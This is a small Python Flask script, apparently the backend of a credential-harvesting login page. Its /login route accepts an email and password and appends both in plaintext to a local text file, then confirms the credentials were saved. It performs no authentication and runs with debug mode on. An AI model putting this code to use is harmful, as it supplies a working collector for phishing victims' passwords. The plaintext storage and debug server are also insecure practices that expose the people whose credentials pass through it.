from flask import Flask, request
import os

app = Flask(__name__)


@app.route("/login", methods=["POST"])
def login():

    email = request.form.get("email")
    password = request.form.get("password")


    file_path = r"C:\Users\GoldenTulip\Desktop\New folder (10)\New Text Document.txt"


    with open(file_path, "a") as file:
        file.write(f"Email: {email}\nPassword: {password}\n\n")

    return "Login credentials saved successfully!", 200


if __name__ == "__main__":

    app.run(debug=True, port=5000)
                                         